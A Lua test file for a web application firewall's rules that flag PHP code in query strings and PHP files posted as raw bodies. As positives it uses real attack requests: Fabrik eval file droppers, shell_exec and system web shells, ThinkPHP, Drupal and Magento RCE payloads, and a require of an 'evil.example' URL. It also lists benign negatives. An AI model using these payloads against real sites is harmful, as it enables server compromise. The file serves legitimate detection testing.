-- Tests for rule 332 (rule_php_code_args, WAF_RCE, logonly): PHP source in
-- the query string, and rule 416 (rule_php_file_body,
-- WAF_PHP_WEBSHELL_BODY, logonly): a PHP file posted as the raw body under a
-- Content-Type no body scanner reads.
--
-- The positives are the requests a 7-day read of the fleet's edge logs found
-- (2026-11-13), and the dmkomotinis.gr Fabrik compromise (earth,
-- 2026-11-12): the listfilter eval that wrote up.php, and up.php receiving
-- yavuzshell.php as application/octet-stream. The negatives are what the
-- same read showed a real site send (a static page linking
-- `?v=<?php echo rand(...); ?>`) and queries that name a sink as prose.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")
local det = require("cfm_waf_detectors")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

-- Percent-encode a query value the way a client does (`[`, `]`, `=` and `&`
-- inside a value would be encoded; the builder below joins pairs itself).
local function ue(s) return (s:gsub("[^%w%-%._~]", function(c) return string.format("%%%02X", c:byte()) end)) end

local function req(o)
  return { uri = o.uri or "/index.php", args = o.args or "", method = o.method or "GET",
           raw_uri = (o.uri or "/index.php") .. ((o.args and o.args ~= "") and ("?" .. o.args) or ""),
           host = "www.example.gr", ip = "194.36.27.8",
           headers = { host = "www.example.gr", ["content-type"] = o.ct,
                       ["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0" },
           body = o.body or "", cookie = "" }
end
-- A Fabrik listfilter eval, exactly as the Fabrik exploit sent it.
local function fabrik(value)
  return req({ args = "option=com_fabrik&view=list&listid=1&resetfilters=1"
    .. "&dm_ypodeigma1a___aiton%5Bvalue%5D=" .. ue(value)
    .. "&dm_ypodeigma1a___aiton%5Beval%5D=1&dm_ypodeigma1a___aiton%5Bcondition%5D=%3D" })
end
local function chrs(str)
  local t = {}
  for i = 1, #str do t[#t + 1] = "chr(" .. str:byte(i) .. ")" end
  return table.concat(t, ".")
end

local function fires(c, label, want, rid)
  local hit, reason, _, action, _, got = waf.check(c)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  check(reason == want, label .. " — reason=" .. want .. " (got " .. tostring(reason) .. ")")
  check(got == rid, label .. " — rule " .. rid .. " (got " .. tostring(got) .. ")")
  check(action == "logonly", label .. " — logonly (got " .. tostring(action) .. ")")
end
local function clean(c, label)
  local hit, reason = waf.check(c)
  check(hit ~= true, label .. " — must NOT fire (got " .. tostring(reason) .. ")")
end

check(waf.get_config().rule_php_code_args == "logonly", "332 ships logonly")
check(waf.get_config().rule_php_file_body == "logonly", "416 ships logonly")

-- ── Rule 332 ────────────────────────────────────────────────────────────────
set_only({ rule_php_code_args = "logonly" })
local A = "WAF_RCE:PHP_ARGS_"

-- dmkomotinis.gr (earth), the chain as it ran.
fires(fabrik("file_put_contents(" .. chrs("f007.txt") .. "," .. chrs("F007_RCE_OK") .. ");"),
      "Fabrik: file_put_contents with chr() names", A .. "CHR_CHAIN", 332)
fires(fabrik("$_f='file_put_'.'contents';$_f(" .. chrs("f007.txt") .. ",'x');"),
      "Fabrik: a sink named in pieces, called through a variable", A .. "NAME_STRING", 332)
fires(fabrik("return ('file_put_'.'contents')('f007x.txt','F0071794486167');"),
      "Fabrik: ('file_'.'…')(…)", A .. "NAME_STRING", 332)
fires(fabrik("return call_user_func('file_put_'.'contents','f007z.txt','F007');"),
      "Fabrik: return call_user_func", A .. "RETURN", 332)
fires(fabrik("$f=fopen('images/f007z.txt','w');fwrite($f,'F007');fclose($f);return 1;"),
      "Fabrik: fopen/fwrite", A .. "RETURN", 332)
fires(fabrik("$h=fopen('up.php','w');fwrite($h," .. chrs("<?php echo fwrite(fopen($_GET['f'],'w'),file_get_contents('php://input'));") .. ");fclose($h);return 1;"),
      "Fabrik: the up.php dropper", A .. "RETURN", 332)
fires(fabrik("$f=fopen('f007sh.php','w');fwrite($f,'<?php echo shell_exec($_GET[\"c\"]);');fclose($f);return 1;"),
      "Fabrik: a literal <?php in the value", A .. "OPEN", 332)
-- Fabrik on virgo (vourazeris.com, 2026-11-10): a filter breakout.
fires(req({ args = "option=com_fabrik&view=list&listid=1&filter=" .. ue("1;file_put_contents('images/m7t.php',base64_decode('77u/PD9waHAK'))") }),
      "Fabrik: filter=1;file_put_contents(base64_decode)", A .. "DECODE", 332)
-- ThinkPHP (136.0.73.70 across titan, rigel, mars, virgo, qualityweb).
fires(req({ uri = "/", args = "p=/&s=" .. ue('<?=/**/file_put_contents("runtime/archive/xz.php",base64_decode("R2lmODk8P3Bo"));?>') }),
      "ThinkPHP ?s=<?=/**/file_put_contents", A .. "OPEN", 332)
-- SPIP (oionei.edu.gr, mars).
fires(req({ uri = "/", args = "page=recherche&recherche=" .. ue('<?php @file_put_contents(_DIR_RACINE."img_cache.php",base64_decode("PD9w")); ?>') }),
      "SPIP recherche=<?php", A .. "OPEN", 332)
-- Magento (mars, orion): the code is the parameter NAME.
fires(req({ method = "POST", uri = "/paypal/transparent/response/", args = ue("<?=eval(hex2bin('2463'))?>"), ct = "application/x-www-form-urlencoded", body = "a=1" }),
      "Magento ?<?=eval(hex2bin(…)) as the key", A .. "OPEN", 332)
-- Drupalgeddon (lpr.gr, qualityweb).
fires(req({ uri = "/", args = "q=user/password&name%5B%23post_render%5D%5B0%5D=array_map&name%5B%23suffix%5D=" .. ue("eval($_POST[c]);//") .. "&name%5B%23markup%5D=assert" }),
      "Drupal #suffix=eval($_POST[c])", A .. "SUPERGLOBAL", 332)
-- ThinkCMF (orion, virgo).
fires(req({ args = "a=fetch&templateFile=public/inde&prefix=''&content=" .. ue("<php>file_put_contents('yTah7AeT4G.php','<?php echo md5(\"ThinkCMF\"); ?>')</php>") }),
      "ThinkCMF content=<php>file_put_contents", A .. "OPEN", 332)
-- pearcmd (virgo): `+` is a space.
fires(req({ uri = "/", args = "+config-create+/" .. ue("<?=(@system(" .. chrs("id") .. "))?>") .. "+/tmp/x.php" }),
      "pearcmd config-create /<?=@system(chr())", A .. "OPEN", 332)
fires(req({ args = "c=" .. ue("$x = shell_exec('id');") }), "an assignment of a sink's result", A .. "ASSIGN", 332)
fires(req({ args = "c=" .. "return+file_put_contents('a.php','x');" }), "`+` read as a space before return", A .. "RETURN", 332)
fires(req({ args = "c=" .. ue("system /**/ ('id').'x'.'y'") }), "a /* */ comment before the paren", A .. "CONCAT", 332)
fires(fabrik("if(1){return system('id');}"), "return after `{`", A .. "RETURN", 332)
fires(fabrik("include $_GET['f'];"), "include without parens, a superglobal", A .. "SUPERGLOBAL", 332)
fires(req({ args = "s=" .. ue("<?php require 'http://evil.example/x.txt'; ?>") }), "require 'url' without parens", A .. "OPEN", 332)
fires(req({ args = "c=" .. ue("$a=1&&system('id')") }), "an encoded && stays in its parameter", A .. "ASSIGN", 332)
fires(req({ args = "c=%2524x%253Dsystem(%2527id%2527)" }), "double-encoded (normalize decodes twice)", A .. "ASSIGN", 332)

-- Negatives: what real sites send.
clean(req({ uri = "/css/media.css", args = "v=" .. ue("<?php echo rand(00000, 99999); ?>") }),
      "static HTML linking ?v=<?php echo rand(...); ?> (no writer)")
clean(req({ args = "option=com_finder&view=search&q=" .. ue("{source}<?php echo md5(44966680); ?>{/source}") }),
      "<?php with no sink (a Sourcerer probe: md5 is not a sink)")
clean(req({ args = "s=" .. ue("operating system (linux)") }), "a search naming system (")
clean(req({ args = "s=" .. ue("how to use file_put_contents() in php") }), "a search naming file_put_contents()")
clean(req({ args = "s=" .. ue("eval( javascript") }), "eval( alone")
clean(req({ args = "language=" .. ue("en' and utl_inaddr.get_host_address((chr(126)||chr(65)||chr(57))) and '1'='1") }),
      "Oracle SQLi chr() chain (no sink)")
clean(req({ args = "q=" .. ue("$pdo->exec('x'); $a::system('y')") }), "methods ->exec( and ::system( are not the builtins")
clean(req({ args = "q=" .. ue("$executive = 'boss'") }), "a variable named like a sink, no call")
clean(req({ args = "utm_source=newsletter&utm_campaign=system(1)&price=$100" }), "system(1) in a UTM value, $100")
clean(req({ args = "s=" .. ue("operating system (linux)") .. "&tpl=" .. ue("'a'.'b'") }), "a sink in one parameter, code syntax in another")
clean(req({ args = "q=exec(&price=" .. ue("$total=5") }), "exec( and an assignment in different parameters")
clean(req({ args = "q=" .. ue("include files in php") }), "include as a word")
clean(req({ args = "q=" .. ue("what to include? 'socks'") }), "include, then a quote not right after it")
clean(req({ args = "" }), "no query")

check(det.detect_php_code_args(nil) == nil, "332 nil")
check(det.detect_php_code_args("") == nil, "332 empty")
check(det.detect_php_code_args("a=1&b=2") == nil, "332 no paren")

set_only({ rule_php_code_args = "disabled" })
clean(fabrik("$f=fopen('x.php','w');return 1;"), "332 disabled")

-- ── Rule 416 ────────────────────────────────────────────────────────────────
set_only({ rule_php_file_body = "logonly" })
local B = "WAF_PHP_WEBSHELL_BODY:BODY_IS_"
local SHELL = "<?php\nsession_start();\n$server_info = [\n    'Disable Function:' => ini_get('disable_functions'),\n];\n"
local function upload(ct, body)
  return req({ method = "POST", uri = "/up.php", args = "f=yavuzshell.php", ct = ct, body = body })
end

fires(upload("application/octet-stream", SHELL), "yavuzshell.php as octet-stream", B .. "PHP_FILE_OCTET", 416)
fires(upload(nil, SHELL), "no Content-Type", B .. "PHP_FILE_NONE", 416)
fires(upload("text/plain", SHELL), "text/plain", B .. "PHP_FILE_TEXT", 416)
fires(upload("application/x-httpd-php", SHELL), "application/x-httpd-php", B .. "PHP_FILE_OTHER", 416)
fires(upload("application/octet-stream", "\239\187\191  \n<?= `id` ?>"), "BOM and blanks, then <?=", B .. "PHP_FILE_OCTET", 416)
fires(upload("image/gif", "GIF89a\n<?php system($_GET['c']); ?>"), "a GIF polyglot", B .. "GIF_POLYGLOT_OTHER", 416)
fires(upload("application/octet-stream", "<?PHP echo 1;"), "upper-case opener", B .. "PHP_FILE_OCTET", 416)
do
  local c = upload("application/octet-stream", SHELL); c.method = "PUT"
  fires(c, "PUT (php://input reads it too)", B .. "PHP_FILE_OCTET", 416)
  c = upload("application/octet-stream", SHELL); c.method = "PATCH"
  fires(c, "PATCH", B .. "PHP_FILE_OCTET", 416)
  c = upload("application/octet-stream", SHELL); c.method = "PUT"; c.uri = "/remote.php/dav/files/u/site/index.php"
  clean(c, "a Nextcloud WebDAV sync PUT of a .php file")
  c = upload("application/octet-stream", SHELL); c.uri = "/remote.php/dav/x.php"
  fires(c, "a POST to /remote.php is still read", B .. "PHP_FILE_OCTET", 416)
end

fires(upload("application/x-www-form-urlencoded", SHELL), "a PHP file relabelled as a form", B .. "PHP_FILE_FORM", 416)
fires(upload("application/json", SHELL), "a PHP file relabelled as JSON", B .. "PHP_FILE_JSON", 416)
clean(upload("application/x-www-form-urlencoded", "content=" .. ue(SHELL)), "a form field with PHP source (the File Manager editor)")
clean(upload("application/x-www-form-urlencoded", "content=" .. SHELL), "a form field, unencoded")
clean(upload("application/json", '{"code":"<?php echo 1;"}'), "JSON")
clean(upload("application/xml", "<?xml version=\"1.0\"?><a/>"), "XML")
clean(upload("multipart/form-data; boundary=b", "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n\r\n<?php\r\n--b--\r\n"),
      "multipart (402's)")
clean(upload("application/octet-stream", "\137PNG\r\n\26\n" .. string.rep("x", 100) .. "<?php"), "a PNG naming <?php past its header")
clean(upload("application/octet-stream", "hello <?php"), "a PHP tag not at the start")
clean(upload("image/gif", "GIF89a" .. string.rep("\0", 300) .. "<?php"), "a GIF tag past 256 bytes")
clean(req({ method = "GET", uri = "/up.php", body = "" }), "GET")

check(det.detect_php_file_body(nil, {}) == nil, "416 nil")
check(det.detect_php_file_body("", {}) == nil, "416 empty")

set_only({ rule_php_file_body = "disabled" })
clean(upload("application/octet-stream", SHELL), "416 disabled")

if fails > 0 then
  io.stderr:write(("cfm_waf php code args / PHP file body tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf PHP code in the query (rule 332) and a PHP file as the body (rule 416)")
